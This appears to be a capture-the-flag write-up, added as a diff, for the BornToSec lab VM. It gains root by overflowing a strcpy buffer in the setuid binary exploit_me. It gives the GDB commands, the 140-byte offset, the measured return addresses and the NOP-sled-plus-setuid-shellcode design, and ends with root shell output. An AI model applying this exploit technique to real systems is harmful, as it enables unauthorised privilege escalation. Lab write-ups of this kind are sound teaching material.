@@ -1,0 +1,101 @@
+# Bonus candidate 3 - Direct stack shellcode and a NOP sled
+
+## Starting point and result
+
+This route starts as `zaz` on the unmodified BornToSec server at
+`192.168.56.101`. Follow the forum, webmail, FTP, bomb, and turtle sequence
+in [writeup1](../writeup1) to obtain that account. The attacker is a Parrot
+VM with SSH access to the target. No root result is assumed.
+
+The route returns into code supplied in the argument to the setuid program
+`/home/zaz/exploit_me`. 
+
+## Check the target
+
+I inspected the binary and its execution settings before using the payload:
+
+```sh
+id
+ls -l /home/zaz/exploit_me
+file /home/zaz/exploit_me
+readelf -W -l /home/zaz/exploit_me | grep GNU_STACK
+cat /proc/sys/kernel/randomize_va_space
+```
+
+```text
+uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 /home/zaz/exploit_me
+/home/zaz/exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+0
+```
+
+The executable stack permits injected instructions to run. The setuid bit
+provides effective UID 0 inside the process, and ASLR is off on this VM.
+The `strcpy` disassembly and the GDB `A`/`BBBB` test in
+[writeup1](../writeup1) show that byte 140 overwrites the saved return
+address: the crash had `eip = 0x42424242`.
+
+## Measure the landing area
+
+Copy the reviewed source [exploit_me.py](../scripts/exploit_me.py) to the
+target. I measured the landing area manually in GDB and stopped after
+`strcpy`, before the overwritten return address was used:
+
+```text
+zaz@BornToSecHackMe:~$ gdb -q /home/zaz/exploit_me
+(gdb) break *0x08048425
+(gdb) run $(python -c 'print "A" * 144')
+(gdb) info registers esp ebp
+```
+
+```text
+Breakpoint 1, 0x08048425 in main ()
+esp = 0xbffffcf0
+ebp = 0xbffffd88
+```
+
+The disassembly puts the destination buffer at `esp + 0x10`, so its GDB
+address is `0xbffffd00`. GDB and normal execution had a small stack
+placement difference. I tested nearby addresses manually in normal setuid
+execution and found `0xbffffd40`, `0xbffffd60`, and `0xbffffd80` reached
+the injected shell. I selected the middle address, `0xbffffd60`.
+
+## Run the payload
+
+The source builds the argument as 100 `0x90` NOP bytes, 31 bytes of
+32-bit Linux shellcode, enough filler to reach byte 140, then the selected
+address in little-endian order. NOPs allow the return to land before the
+first instruction. The shellcode invokes `setuid(0)` (syscall 23) and
+`execve("/bin//sh", NULL, NULL)` (syscall 11). Setting UID 0 before
+executing the shell is why both real and effective UID become 0. The
+argument contains no NUL byte, which matters because `strcpy` would stop
+at one.
+
+```sh
+python /home/zaz/exploit_me.py stack
+```
+
+The program first prints the raw argument because it calls `puts`. The
+resulting shell then gave this normal-process proof, outside GDB:
+
+```text
+# id -u
+0
+# whoami
+root
+# id -ru
+0
+```
+
+The payload needs a return address measured for the defense VM and the same
+launcher environment. If the manual GDB measurement reports a different
+buffer, update `STACK_RET` in the source and repeat the normal-process
+identity check.
+
+**Reproduction check:** reach `zaz`; verify setuid, executable stack,
+ASLR, and the 140-byte offset; copy only the Python source; confirm the
+normal-process landing address; run the payload and show `id -u`,
+`whoami`, and `id -ru` in the server shell. This uses the same `strcpy`
+overflow as the environment placement in candidate 4, so an evaluator may
+count the two as one underlying vulnerability.
